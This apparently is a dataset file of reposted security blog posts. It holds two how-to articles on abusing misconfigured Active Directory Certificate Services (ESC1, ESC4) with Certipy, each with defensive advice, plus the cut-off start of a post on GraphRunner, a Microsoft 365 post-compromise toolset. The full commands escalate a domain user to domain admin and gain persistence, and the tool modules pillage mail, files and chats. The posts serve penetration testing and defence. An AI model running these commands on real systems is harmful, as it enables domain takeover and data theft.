exploit Active Directory Certificate Services. Similarly, tools have been published to help blue teamers identify and remediate these issues.\n\nThis blog post is the start of a short series that will cover ADCS attacks primarily using Certipy (https://github.com/ly4k/Certipy). Certipy is a Python-based offensive security tool that can be used to enumerate and abuse vulnerable ADCS. Certipy is the tool I use most often, but I have listed a few other related tools below:\n\nPKINITtools: https://github.com/dirkjanm/PKINITtools\n\nPyWhisker: https://github.com/ShutdownRepo/pywhisker\n\nCerti: https://github.com/zer1t0/certi\n\nImpacket: https://github.com/fortra/Impacket\n\nCertify: https://github.com/GhostPack/Certify\n\nAbusing Misconfigured Templates\n\nCertificate templates are Active Directory objects used to define certificate policies. In the certificate template, an admin can specify settings such as the subject (the identity), validity period, and purpose, as well as users authorized to request a certificate. Users authorized in the template settings can request a certificate based on configurations defined in the certificate template.\n\nUsers authorized to request a certificate can be defined using a descriptor on the Certificate Authority itself and in the certificate template object.\n\nTo enumerate ADCS template information from your target domain, you need valid domain credentials. Based on my experience, enumeration of ADCS does not usually require a highly privileged domain account. Any domain credential can typically be used to query ADCS templates and configuration details.\n\nIn the following example, let's imagine that we have gained a foothold in our target company FOOBAR's internal network and have compromised the account of a user with the name \"billy.\" We want to enumerate the ADCS configuration for the internal target domain \"foobar.com\".\n\nTo enumerate ADCS configurations with Certipy, use the find command. By specifying the -enabled and -vulnerable flags, we can tell Certipy to specifically print out vulnerable templates that are enabled. \n\nThe full Certipy command is shown below:\n\ncertipy find -u 'billy@foobar.com' -p -dc-ip -vulnerable -enabled\n\nCertipy outputs the configuration details of interest in JSON (JavaScript Object Notation) and TXT files following the naming convention \"_Certipy\" as shown in the figure below. Certipy also runs BloodHound collectors which output to a zip file following the same naming convention. The BloodHound results can be imported into your BloodHound database and used to obtain a visual of potential domain privilege escalation paths. BloodHound is out of scope for this particular blog post. However, if you are interested in leveraging this feature, here are a couple things to note:\n\nAt the time of writing, Certipy generates BloodHound data that can only be ingested by a fork of BloodHound found here: https://github.com/ly4k/BloodHound.\n\nTo use BloodHound maintained at https://github.com/BloodHoundAD/BloodHound, you need to specify the -old-bloodhound flag. \n\nFind Vulnerable Templates\n\nA simple grep command using search terms like \"ESC\" can be used to check the resulting TXT file for escalation opportunities discovered by Certipy.\n\nFor example, we can check the file for ESC1 as follows:\n\nGrep for ESC1\n\nESC1\n\nA certificate template with the ESC1 vulnerability allows low privileged users to enroll and request a certificate on behalf of any domain object specified by the user. This means that any user with enrollment rights can request a certificate for a privileged account such as a domain administrator.\n\nTemplates vulnerable to ESC1 have the following configurations:\n\nClient Authentication: True\n\nEnabled: True\n\nEnrollee Supplies Subject: True\n\nRequires Management Approval: False\n\nAuthorized Signatures Required: 0\n\nUpon investigating the Certipy output file \"20230602164801_Certipy.txt\", we notice that Certipy found an ESC1 vulnerability on the first template called \"FOO_Templ\". All conditions for ESC1 are met by the \"FOO_Templ\" template.\n\nESC1 Template\n\nAs shown in the figure below, the \"Permissions\" section of the vulnerable template states that users in the Domain Users or Authenticated Users groups can enroll. This means that any domain user can request a certificate on behalf of a Domain Admin.\n\nFOO_Templ Permissions\n\nOur compromised user account \"billy\" is a part of the Domain Users group and therefore is authorized to request a certificate using the vulnerable template. We can request a certificate for Dan the DA by setting the user's principal name (UPN) to DA_Dan@foobar.com. The Certipy arguments required to request a certificate are as follows: \n\nu - username\n\np - compromised user password\n\ndc-ip - domain controller IP address\n\ntarget - target CA (Certificate Authority) DNS (Domain Name System) Name\n\nca - short CA Name\n\ntemplate - vulnerable template name\n\nupn - target user/object name\n\nThe full Certipy command is shown below:\n\ncertipy req -u 'billy@foobar.com' \\\n-p '' \\\n-dc-ip '10.10.1.100' \\\n-target ' foobar-CA.foobar.com ' \\\n-ca 'foobar-CA' -template 'FOO_Templ'\\\n-upn 'DA_Dan@foobar.com' \n\nNote: The Certipy results will return the request ID or an Object SID. Note this, as you will need this information to revoke the certificate once the test is completed.\n\nGet Certificate for DA_Dan\n\nAs shown in the figure above, our certificate and private key are stored in the \"DA_Dan.pfx\" file.\n\n**Troubleshooting Sidebar**\n\nIf this does not work and you receive an error that says something like SMB (Server Message Block) SessionError: STATUS_NOT_SUPPORTED`\n\nYou can try to use Kerberos authentication instead of username and password. Gabriel Prud'homme (vendetce) taught me this work around so if it works for you hit him up and tell him how dope he is! To get a service ticket for your user, you can use Impacket's getTGT module (https://github.com/fortra/impacket/blob/impacket_0_10_0/examples/getTGT.py).\n\npython3 getTGT.py 'foobar.com/billy'\n\nGet TGT\n\n After you run the command above, you will be prompted for the password for your user and the module will return a CCache file with the name \".ccache.\". Export the resulting CCache file to an environment variable like so:\n\n *Make sure to include the full path to your CCache file*\n\nexport KRB5CCNAME=/full/path/to/billy.ccache\n\nTo request a certificate using Kerberos authentication the command will be similar to the previous except we will use -k for use Kerberos authentication and -no-pass. The full Certipy command is shown below: \n\ncertipy req -u 'billy@foobar.com' -k -no-pass \\\n-dc-ip '10.10.1.100' \\\n-target ' foobar-CA.foobar.com ' \\\n-ca 'foobar-CA' -template 'FOO_Templ'\\\n-upn 'DA_Dan@foobar.com' \n\n**End Sidebar**\n\nOnce we have our certificate, we can use the certificate to obtain the credential hash and a Kerberos ticket of the target DA account using the Certipy -auth command as shown below:\n\ncertipy auth -pfx DA_Dan.pfx\n\nAs shown in the figure below, we successfully retrieved the hash for the DA_Dan account. Now we can impersonate DA_Dan!\n\nGet DA_Dan Credentials\n\nIn summary, due to the overly permissive ADCS template, we were able to escalate from a normal domain account to a Domain Administrator account.\n\nValidity Period\n\nIt is important to note that the certificate obtained will be valid for the DA account until the validity period ends unless the certificate is explicitly revoked. Let's look at the vulnerable template again. As we can see in the figure below, the template specifies a validity period of 5 years.\n\nValidity Period\n\nThis means that we will have access to DA Dan's account for the next five years, regardless of any password changes. We can also renew the certificate before the expiration date to maintain access to the account. Which means that this technique is not only a handy privilege escalation technique but could serve as a means of persistence as well.\n\nI have observed certificate templates with validity periods of 1-10 years. I typically see templates with a validity period of 3-5 years. This may be a common practice or a default configuration, it may not, this is just based on what I have observed in various enterprise environments that I have tested.\n\nPrevention and Detection\n\nSo, what can we do to prevent and detect such attacks? Here are a few steps you can take to harden your certificate templates.\n\nTake stock of your certificate templates and determine whether all enabled templates are currently in use. Disable all templates that are unnecessary.\n\nMake sure that template permissions are as restrictive as possible. Only grant necessary groups/users enrollment permissions.\n\nModify the \"Issuance Requirements\" to require the manual approval of an issued certificate where possible.\n\nDisable the \"Enrollee Supplies Subject\" flag where possible.\n\nRemove \"Client Authentication\" where possible.\n\nMonitoring\n\nBy monitoring certificate enrollment events for users, you can detect when an account requests a certificate and when your CA issues a certificate. By monitoring certificate enrollment events, an administrator can alert on anomalous behavior and revoke certificates that appear to be malicious or suspicious. Some useful event IDs can be found below:\n\n4886 - Request for certificate\n\n4887 - Certificate Issued\n\n4768 - Request for Kerberos ticket (TGT)\n\nDefensive Resources:\n\n\"Defensive Guidance\" section of Certified_Pre-Owned5\n\nMicrosoft PKI defensive guidance: https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn786443(v=ws.11)\n\nPKIAudit: https://github.com/GhostPack/PSPKIAudit\n\nAdditional Resources\n\nhttps://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831740\n\nSpecterOps Whitepaper: https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf\n\nSpecterOps Blog Post: https://posts.specterops.io/certified-pre-owned-d95910965cd2\n\nhttps://specterops.io/wp-content/uploads/sites/3/2022/06/an_ace_up_the_sleeve.pdf\n\nhttps://www.securew2.com/blog/how-to-revoke-certificate-in-windows-ad-cs\n\nhttps://www.thehacker.recipes/ad/movement/ad-cs/certificate-templates\n\nhttps://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/\n\nPKINITtools: https://github.com/dirkjanm/PKINITtools\n\nPyWhisker: https://github.com/ShutdownRepo/pywhisker\n\nCerti: https://github.com/zer1t0/certi\n\nImpacket: https://github.com/fortra/Impacket\n\nCertipy: https://github.com/ly4k/Certipy\n\nCertify: https://github.com/GhostPack/Certify\n\nFootnotes\n\n[1] https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831740(v=ws.11)\n\n[2] https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf\n\n[3] https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf\n\n[4] https://posts.specterops.io/certified-pre-owned-d95910965cd2\n\n[5] https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf\n\nREAD:\n\nPART 2\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Abusing Active Directory Certificate Services  Part 2\"\nTaxonomies: \"Alyssa Snow, Blue Team, External/Internal, How-To, Informational, Red Team, Red Team Tools, Active Directory, exploit\"\nCreation Date: \"Thu, 12 Oct 2023 15:44:18 +0000\"\n\n| Alyssa Snow\n\nMisconfigurations in Active Directory Certificate Services (ADCS) can introduce critical vulnerabilities into an Enterprise Active Directory environment, such as paths of escalation from low privileged accounts to domain administrator.\n\nIn PART ONE of this short ADCS series, we introduced Active Directory Certificate Services at a high level and walked through one of the escalation techniques, ESC1.  In this post, we will walk through the escalation technique, ESC4, using Certipy.\n\n ESC4 \n\nThis issue occurs when a certificate template can be modified by a non-administrator account. This misconfiguration can occur when unintended users are granted one of the following template security permissions:\n\nOwner\n\nWriteOwnerPrincipals\n\nWriteDaclPrincipals\n\nWritePropertyPrincipals\n\nExample\n\nIn the following example, let's imagine that we have gained a foothold in our target company FOOBAR's internal network and have compromised the account of a user with the name \"billy\"; we have enumerated the ADCS configuration for the internal target domain \"foobar.com\".\n\nAs shown in the figure below, the \"ESC4Certificate_FOOBAR\" template was configured to grant the \"Domain Users\" group with Write Owner Principals and Write Property Principals permissions. This means that any foobar.com user has permission to modify any given property in the template.\n\nESC4 Template\n\nOur compromised user account \"billy\" is a part of the \"Domain Users\" group and therefore is authorized to modify the template configuration.We can introduce escalation conditions using the following Certipy command:\n\ncertipy template \n-u billy@foobar.com \\\n-p REDACTED \\\n-template ESC4Certificate_FOOBAR \\\n-dc-ip \\\n-save-old\n\nCertipy Results\n\nAs shown in the figure above, the original template was saved in the \"ESC4Certificate_FOOBAR.json\". We can use the configuration file to easily revert the template configuration to its original state once we've completed this attack. The target template was updated to meet the following ESC1 conditions:\n\nClient Authentication: True\n\nEnabled: True\n\nEnrollee Supplies Subject: True\n\nRequires Management Approval: False\n\nAuthorized Signatures Required: 0\n\nIn addition, the template Validity Period was increased from 4 years to 5 years. Now this vulnerable template can be used by any domain user to request a certificate on behalf of any other domain account. The modified template is shown below.\n\nModified Vulnerable Certificate\n\nTo demonstrate this, we can request a certificate for \u201cDan the DA\u201d by setting the user principal name (UPN) to DA_Dan@foobar.com.\n\ncertipy req -u 'billy@foobar.com' \\\n-p 'REDACTED' \\\n-dc-ip '10.10.1.100' \\\n-target 'foobar-CA.foobar.com ' \\\n-ca 'foobar-CA' \\\n-template 'ESC4Certificate_FOOBAR' \\\n-upn 'DA_Dan@foobar.com' \n\nNote: The Certipy results will return the request ID or an Object SID. Note this, as you will need this information to revoke the certificate once the test is completed.\n\nRequest Certificate for Domain Admin\n\nOnce we have our certificate, we can use the certificate to obtain the credential hash and a Kerberos ticket of the target DA account using the Certipy -auth command as shown below:\n\ncertipy auth -pfx DA_Dan.pfx\n\nAs shown in the figure below, we successfully retrieved the hash for the DA_Dan account. Now we can impersonate DA_Dan!\n\nGet DA_Dan Credentials\n\nIn summary, the template \"ESC4Certificate_FOOBAR\" was configured to allow users from the Domain Users group (non-Administrator accounts) to modify the template configuration. This allowed the standard domain user, Billy, to modify the template \"ESC4Certificate_FOOBAR\" and introduce vulnerabilities that allowed escalation from a normal domain account to a Domain Administrator account.\n\nClean Up\n\nTo restore the template configuration to its original state, use the following template command:\n\ncertipy template \n-u user@foobar.com \\\n-p REDACTED \\\n-template ESC4Certificate_FOOBAR \\\n-dc-ip \\\n--configuration 'ESC4Certificate_FOOBAR.json'\n\nRevert Template to Original Configuration\n\nPrevention and Detection\n\nSo, what can we do to prevent and detect such attacks? Here are a few steps to harden your certificate templates.\n\nTake stock of your certificate templates and determine whether all enabled templates are currently in use. Disable all templates that are unnecessary.\n\nMake sure that template permissions are as restrictive as possible. Only grant necessary groups/users enrollment permissions. Only grant necessary groups/users permission to modify template properties.\n\nModify the \"Issuance Requirements\" to require the manual approval of an issued certificate where possible.\n\nDisable the \"Enrollee Supplies Subject\" flag where possible.\n\nRemove \"Client Authentication\" where possible.\n\nMonitoring\n\nIt's uncommon for certificate templates to be changed regularly. Detections should be built around unexpected template configuration changes. Event IDs 4900 and 4899 occur when an ADCS object changes and enrollment occurs.By monitoring certificate change events, an administrator can alert on anomalous behavior, investigate template changes, and revoke certificates that appear to be malicious or suspicious. Some useful event IDs can be found below:\n\n4900 - Security permissions for a certificate template changed\n\n4899 - Certificate template was updated\n\n4886 - Request for certificate\n\n4887 - Certificate Issued\n\n4768 - Request for Kerberos ticket (TGT)\n\nDefensive Resources:\n\n\"Defensive Guidance\" section of Certified_Pre-Owned\n\nMicrosoft PKI defensive guidance: https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn786443(v=ws.11)\n\nPKIAudit: https://github.com/GhostPack/PSPKIAudit\n\nAdditional Resources\n\nhttps://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831740\n\nSpecterOps Whitepaper: https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf\n\nSpecterOps Blog Post: https://posts.specterops.io/certified-pre-owned-d95910965cd2\n\nhttps://specterops.io/wp-content/uploads/sites/3/2022/06/an_ace_up_the_sleeve.pdf\n\nhttps://www.securew2.com/blog/how-to-revoke-certificate-in-windows-ad-cs\n\nhttps://www.thehacker.recipes/ad/movement/ad-cs/certificate-templates\n\nhttps://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/\n\nPKINITtools: https://github.com/dirkjanm/PKINITtools\n\nPyWhisker: https://github.com/ShutdownRepo/pywhisker\n\nCerti: https://github.com/zer1t0/certi\n\nImpacket: https://github.com/fortra/Impacket\n\nCertipy: https://github.com/ly4k/Certipy\n\nCertify: https://github.com/GhostPack/Certify\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Introducing GraphRunner: A Post-Exploitation Toolset for Microsoft 365\"\nTaxonomies: \"Beau Bullock, How-To, Red Team, Red Team Tools, Steve Borosh, Azure, cloud, microsoft365\"\nCreation Date: \"Thu, 19 Oct 2023 17:59:35 +0000\"\nBy Beau Bullock & Steve Borosh\n\nTL;DR\n\nWe built a post-compromise toolset called GraphRunner for interacting with the Microsoft Graph API. It provides various tools for performing reconnaissance, persistence, and pillaging of data from a Microsoft Entra ID (Azure AD) account. Below are some of the main features. At the end of the blog post, make sure to take a peek at the potential attack path scenarios we have laid out. There are a few in there we think may be quite interesting to both offensive and defensive security team members.\n\nMain Features:\n\nSearch and export email\n\nSearch and export SharePoint and OneDrive files accessible to a user\n\nSearch all Teams chats and channels visible to the user and export full conversations\n\nDeploy malicious apps\n\nDiscover misconfigured mailboxes that are exposed\n\nClone security groups to carry out watering hole attacks\n\nFind groups that can be modified directly by your user or where membership rules can be abused to gain access\n\nSearch all user attributes for specific terms\n\nLeverage a GUI built on the Graph API to pillage a user's account\n\nDump conditional access policies\n\nDump app registrations and external apps including consent and scope to identify potentially malicious apps\n\nTools to complete OAuth flow during consent grant attacks\n\nContinuously refresh your token package\n\nGraphRunner doesn't rely on any third-party libraries or modules\n\nWorks with Windows and Linux\n\nYou can find GraphRunner here: https://github.com/dafthack/GraphRunner/\n\nThe Graph API\n\nThe Microsoft Graph API is undeniably one of the most important pieces of infrastructure to enable Microsoft cloud services to function. Everything from Outlook to SharePoint to Teams to Entra ID rely on this API. Most of the time when you are interacting with Microsoft services, you never visually see the Graph API but, under the hood, it is constantly being utilized. There are PowerShell modules that use it, such as the MSOnline or AzureAD modules. The AZ command line tool (az cli) also uses it. As an administrator, the Graph API is a very powerful tool for carrying out tasks in Azure.\n\nBut what about as a normal user?\n\nDuring penetration tests, red team engagements, cloud assessments, and other offensive security assessments, there are often times where we obtain access to an M365 user's account. This could be due to various attacks such as password spraying or phishing being successful. Through a web browser, we may be able to access certain resources like email and file sharing services. But there are many other data points that can be collected from a Microsoft tenant besides email and files. The Azure (Entra) Portal is a good place to start, but it can easily be locked down so that only administrative users can utilize it.\n\nLuckily, access to the Graph API is necessary for much of Microsoft 365 to function. Even when access to the Azure Portal is blocked, most of the same data can be accessed via the API and, in some cases, interacted with. Through performing offensive engagements, we have found ourselves in this situation many times. In exploring what the API has to offer, through real-world engagements as well as R&D sessions, a toolset began to be developed internally at BHIS.\n\nIn this blog post, you will find a thorough description of each piece of the toolset we are releasing. Additionally, we present several attack path scenarios to demonstrate situations where you may find this toolset useful. Some of these attack paths may be familiar while others may not. Our goal in releasing this toolset is primarily to provide offensive operators the tools they need to quickly identify security issues in Microsoft cloud environments. But this tool can also be leveraged by defenders to preemptively identify security issues and mitigate them.\n\nNow, let\u2019s dive into what GraphRunner is all about.\n\nThere are three main pieces to GraphRunner: \n\nGraphRunner.ps1 - A PowerShell script containing a number of modules for post-compromise recon, persistence, and pillaging of an account. \n\nGraphRunnerGUI.html - An HTML graphic user interface to be used with an access token. Provides various modules around enumeration and pillaging data from services such as Outlook, SharePoint, OneDrive, and Teams. \n\nPHPRedirector -A basic PHP script that can be used to capture OAuth authorization codes during an OAuth consent flow and a Python script to automatically complete the flow to obtain access tokens.\n\nGraphRunner PowerShell\n\nGraphRunner includes a PowerShell set of tools to assist with carrying out various attacks during post-exploitation of a Microsoft Entra ID (Azure AD) tenant. Most of the modules rely on having authenticated access tokens. To assist with this, there are multiple modules for obtaining and working with both user and application (service principal) tokens. The majority of modules don\u2019t require a privileged account.\n\nTo get started, import GraphRunner into a new PowerShell session.\n\nImport-Module .\\GraphRunner.ps1\n\nHere\u2019s a high-level summary of each module included in the PowerShell script:\n\nAuthentication\n\nGet-GraphTokens - Authenticate as a user to Microsoft Graph\n\nInvoke-RefreshGraphTokens - Use a refresh token to obtain new access tokens\n\nGet-AzureAppTokens - Complete OAuth flow as an app to obtain access tokens\n\nInvoke-RefreshAzureAppTokens - Use a refresh token and app credentials to refresh a token\n\nInvoke-AutoTokenRefresh - Refresh tokens at an interval\n\nRecon & Enumeration Modules\n\nInvoke-GraphRecon - Performs general recon for org info, user settings, directory sync settings, etc.\n\nInvoke-DumpCAPS - Gets conditional access policies\n\nInvoke-DumpApps - Gets app registrations and external enterprise apps, along with consent and scope info\n\nGet-AzureADUsers - Gets user directory\n\nGet-SecurityGroups - Gets security groups and members\n\nGet-UpdatableGroups - Gets groups that may be able to be modified by the current user\n\nGet-DynamicGroups - Finds dynamic groups and displays membership rules\n\nGet-SharePointSiteURLs - Gets a list of SharePoint site URLs visible to the current user\n\nInvoke-GraphOpenInboxFinder - Checks each user\u2019s inbox in a list to see if they are readable\n\nGet-TenantID - Retrieves the tenant GUID from the domain name\n\nPersistence Modules\n\nInvoke-InjectOAuthApp - Injects an app registration into the tenant\n\nInvoke-SecurityGroupCloner - Clones a security group while using an identical name and member list but can inject another user as well\n\nInvoke-InviteGuest - Invites a guest user to the tenant\n\nInvoke-AddGroupMember - Adds a member to a group\n\nPillage Modules\n\nInvoke-SearchSharePointAndOneDrive - Search across all SharePoint sites and OneDrive drives visible to the user\n\nInvoke-ImmersiveFileReader - Open restricted files with the immersive reader\n\nInvoke-SearchMailbox - Has the ability to do deep searches across a user\u2019s mailbox and can export messages\n\nInvoke-SearchTeams - Can search all Teams messages in all channels that are readable by the current user\n\nInvoke-SearchUserAttributes - Search for terms across all user attributes in a directory\n\nGet-Inbox - Gets the latest inbox items from a mailbox and can be used to read other user mailboxes (shared)\n\nGet-TeamsChat - Downloads full Teams chat conversations\n\nInvoke-GraphRunner Module\n\nInvoke-GraphRunner - Runs Invoke-GraphRecon, Get-AzureADUsers, Get-SecurityGroups, Invoke-DumpCAPS, Invoke-DumpApps, and then uses the default_detectors.json file to search with Invoke-SearchMailbox, Invoke-SearchSharePointAndOneDrive, and Invoke-SearchTeams.\n\nSupplemental Modules\n\nInvoke-AutoOAuthFlow - Automates the OAuth flow completion to obtain access and refresh keys when a user grants consent to an app registration\n\nInvoke-DeleteOAuthApp - Delete an OAuth App\n\nInvoke-DeleteGroup - Delete a group\n\nInvoke-RemoveGroupMember - Module for removing users/members from groups\n\nInvoke-DriveFileDownload - Has the ability to download single files from SharePoint and OneDrive as the current user\n\nInvoke-CheckAccess - Check if tokens are valid\n\nInvoke-HTTPServer - A basic web server to use for accessing the emailviewer that is output from Invoke-SearchMailbox\n\nInvoke-BruteClientIDAccess - Test different client_id\u2019s against MSGraph to determine permissions\n\nInvoke-ImportTokens - Import tokens from other tools for use in GraphRunner\n\nGet-UserObjectID - Retrieves an Object ID for a user\n\nAuthentication\n\nA good place to start is to authenticate with the Get-GraphTokens module. This module will launch a device-code login, allowing you to authenticate the PowerShell session from a browser session. Access and refresh tokens will be written to the global $tokens variable and your tenant ID will be written to the $tenantid variable. To use them with other GraphRunner modules use the Tokens flag (Example: Invoke-DumpApps -Tokens $tokens).\n\nEnter the code at microsoft.com/devicelogin to authenticate your session.\n\nAccess tokens typically have an expiration time of one hour so it will be necessary to refresh them occasionally. If you have already run the Get-GraphTokens command, your refresh tokens will be utilized from the $tokens variable automatically when you run Invoke-RefreshGraphTokens to obtain a new set of tokens.\n\nGraphRunner also includes modules for authenticating as a service principal. This can be useful for leveraging an app registration (as detailed later in the Persistence section in this blog post). The Get-AzureAppTokens module can assist with completing an OAuth flow to obtain access tokens for an Azure App Registration. After obtaining an authorization code, it can be utilized with a set of app registration credentials (client id and secret) to complete the flow.\n\nRecon & Enumeration\n\nGraphRunner includes a number of reconnaissance modules to determine configuration settings, list objects, and identify attack paths in a tenant. The Invoke-GraphRecon module gathers general information about the tenant including the primary contact info, directory sync settings, and user settings such as if users have the ability to create apps, create groups, or consent to apps. The primary contact information for the tenant is displayed along with directory sync settings, and user settings.\n\nThe authorization policy section includes configuration settings such as if users can read their own Bitlocker keys, who can invite external users, if MSOL PowerShell is blocked, and more.\n\nThe Invoke-GraphRecon module also has a switch called \u201cPermissionEnum\u201d. If this switch is set, it will use an undocumented \u201cEstimate Access\u201d API to brute force a list of almost 400 actions (permissions reference: https://learn.microsoft.com/en-us/azure/active-directory/roles/permissions-reference) to determine what actions the current user is allowed to do. This is useful for discovering what unique actions your user is able to perform in the tenant. Additionally, when we get into the group editing section later in the blog post, this method is useful for helping determine what access may have changed.\n\nThe Invoke-DumpCAPS module dumps conditional access policies from a tenant. This module uses the legacy Azure Active Directory Graph API (graph.windows.net) to pull the policies.\n\nA module detailed later in this blog post around injecting app registrations (Invoke-InjectOAuthApp) spurred the creation of the Invoke-DumpApps module. This module can assist in identifying malicious app registrations. It will dump a list of Azure app registrations from the tenant, including permission scopes and users that have consented to the apps. Additionally, it will list external apps that are not owned by the current tenant or by Microsoft's main app tenant. This is a way to find third-party external apps that users may have consented to.\n\nThe Get-AzureADUsers and Get-SecurityGroups modules can be used to dump users and groups from the tenant.\n\nGroup-based attacks are one of the more interesting areas to highlight when it comes to GraphRunner\u2019s capabilities. Our first use-case for attacking M365 groups involves changing group membership of certain groups, even as a non-administrative user. For example, GraphRunner has modules that help in exploiting the fact that the default behavior for Microsoft 365 groups is that anyone in the organization can join them. Whenever a team is created, so is a Microsoft 365 group. With that comes the automatic creation of a SharePoint site, a mailbox, Teams channel, and more.\n\nhttps://learn.microsoft.com/en-us/azure/active-directory/enterprise-users/groups-self-service-management\n\nAs detailed in Microsoft\u2019s documentation (screenshot below), the default behavior for Microsoft 365 groups makes them open for all to join. Also, note that in some scenarios, security groups can be configured to be joinable as well.\n\nhttps://learn.microsoft.com/en-us/microsoftteams/office-365-groups\n\nThis is where the Get-UpdatableGroups module comes in. This module also leverages the \u201cEstimate Access\u201d API to determine if your current user has the ability to update groups in the tenant. It will gather all groups from the tenant and check them one by one to determine if they are modifiable.\n\nIf you find modifiable groups, that means that your current user has the ability to add members to that group, including yourself, other tenant members, and even guests. This can lead to privilege escalation scenarios as we demonstrate in the attack paths section later in the post.\n\nOn a similar topic, \u201cdynamic groups\u201d are another interesting attack path in Microsoft 365. Dynamic groups are groups that are created with dynamic group membership rules. When created, dynamic groups are configured with a set of rules that automatically process objects into groups with certain attributes. These groups can include various parameters such as the user\u2019s email, location, job title, device, and more. They can help to automatically add users to groups but when misconfigured can be abused by attackers.\n\nIn the example above, this dynamic group is configured to add any users whose user principal name contains the word \u201cadmin\u201d. This scenario can be exploited by simply inviting a guest user to the tenant with an email address that contains \u201cadmin\u201d in it. Upon being added as a guest to the tenant, the account with \u201cadmin\u201d in the name would automatically get added to the dynamic group.\n\nGraphRunner helps in finding dynamic groups with the Get-DynamicGroups module. After listing out dynamic groups in a tenant, it would be necessary to analyze the membership rules to determine the potential for exploitability.\n\nThe Get-SharePointSiteURLs module goes hand-in-hand with the groups modules mentioned previously. It uses the Graph Search API to try to locate all unique sites the user has access to. It can be useful to run both prior to and after performing any group-based abuse to determine what new sites you have gained access to.\n\nIn 2017, I (Beau) wrote a post about abusing Exchange mailbox permissions. Back then, I wrote a module called Invoke-OpenInboxFinder for MailSniper that assisted in finding mailboxes that were configured so that other users in the organization could access them. That module leveraged Exchange Web Services and Outlook Web Access. It turns out that the same type of mailbox enumeration can be performed via the Microsoft Graph API. GraphRunner has the Invoke-GraphOpenInboxFinder module to carry out this task.\n\nIn order for this to work, you will need a token that is scoped to the Mail.Read.Shared permission or the Mail.ReadWrite.Shared permission. This can be accomplished by consenting to an application with this scoped permission. One quick and easy way to do this is to leverage the Graph Explorer. It is a well-known application for testing out Graph API calls and you can consent to specific permissions here: https://developer.microsoft.com/en-us/graph/graph-explorer. After consenting, you can click the \u201cAccess token\u201d tab to view your token and then set it to the $tokens.access_token variable in your GraphRunner session.\n\nNow running the Invoke-GraphOpenInboxFinder module against a userlist will attempt to access each inbox from the provided list. If a user has set their inbox permissions too widely, it\u2019s possible your current user may be able to read messages from their inbox.\n\nPersistence\n\nWhen it comes to maintaining access, GraphRunner has a few modules that can help to establish various levels of persistence in a tenant. Deploying an application to a tenant is interesting in multiple scenarios. By default, users can create applications. But, by default, they cannot add administrative privileges such as Directory.ReadWrite.All. They can, however, add a number of delegated privileges that do not require admin consent by default. Most of these privileges that do not require admin consent are for performing common tasks such as reading email (Mail.Read), listing users in the directory (User.ReadBasic.All), navigating SharePoint and OneDrive (Files.ReadWrite.All and Sites.ReadWrite.All), and many more.\n\nBy deploying an app with these permissions and then consenting to it as a user we have compromised, we can then leverage the service principal credentials tied to the application to access the user\u2019s account. If the compromised user changes their password, the app still retains access to their account. If all sessions are killed for the compromised user, we still have access until the access token expires (default is 1 hour) to operate as the user.\n\nThe Invoke-InjectOAuthApp module is a tool for automating the deployment of an app registration to a Microsoft tenant. In the event that the Azure portal is locked down, this may provide an additional mechanism for app deployment, provided that users are allowed to register apps in the tenant.\n\nThis module has a few hardcoded scope settings for quick deployment of certain types of apps, but custom values can be entered as well. For example, when setting the -scope parameter to \u201cop backdoor\u201d, the tool will create an app and add a large number of common permissions to it, including access to Mail, Files, Teams, and more. None of these permissions require admin consent.\n\nAfter the app is deployed, the consent URL is automatically generated and displayed in the terminal (in green above). This URL is custom and tied to the specific app registration, including all of the requested scope items. When a user visits this URL, they will be asked to consent to the permissions set for the app.\n\nA few years ago, this was leveraged heavily by attackers carrying out illicit consent grant phishing attacks. Microsoft made some changes that effectively limited what an external, unverified app could request access to for users not in the same tenant. When an app is deployed in the same tenant as the victim being phished, this is not the case. Later in the attack paths section, an internal app-based phishing scenario is laid out. But in terms of persistence, we would be visiting this link as our compromised user and consenting to it ourselves.\n\nWhen an application with delegated permissions is consented to, we need to catch the OAuth code that is sent to the specified redirect URI in order to complete the flow and obtain access tokens. GraphRunner has multiple ways built-in to catch and complete the OAuth flow once consent has been granted. In situations where the user is remote, you would most likely want to stand up a web server and use something like the basic PHP redirector included in the GraphRunner repo to capture the code and complete the flow.\n\nIf we are creating persistence within an account we control, it's possible to complete this flow by directing the browser to localhost. The Invoke-AutoOAuthFlow module stands up a minimal web server to listen for this request and completes the OAuth flow with the provided app registration credentials. When a \u201clocalhost\u201d URL such as \u201chttp://localhost:8000\u201d is set as the ReplyURL with Invoke-InjectOAuthApp, it will automatically detect it and ouput the exact command needed to run in another terminal to catch and complete the flow.\n\nPrior to navigating to the consent URL and clicking consent, run the command that was output in another terminal. It will listen for requests to it containing the OAuth code and automatically complete the flow using the service principal\u2019s credentials. Upon successfully completing the flow, it will output a new set of access tokens, as well as write them to the global $apptokens variable in the terminal. Now when you run GraphRunner modules, you can specify the app tokens (-Tokens $apptokens) and it will run in the context of the application leveraging the delegated permissions consented to in the user account.\n\nAnother potentially interesting attack vector via groups would be to create groups in an attempt to exploit watering hole-style attacks. In this scenario, an attacker would create a group to resemble another group that already exists but include their own user within it. When applying permissions to a group via the Azure Portal, the Microsoft Admin portal, SharePoint sites, and other locations, it\u2019s not always clear exactly what group a policy is being applied to. For example, when applying a role to a resource in the Azure Portal \u2014 such as when a user is granted permissions to read, contribute, or own a resource \u2014 only the name of the group or user is displayed. No other identifiable information about the group is provided here.\n\nGraphRunner has a module called Invoke-SecurityGroupCloner that automates the ability to clone a group while adding your user or another of your choosing.\n\nRunning this module will list out all the groups in the tenant along with their members.\n\nThe Invoke-SecurityGroupCloner module will then ask what group you want to clone, if you want to add your current user to the group, if you want to add a 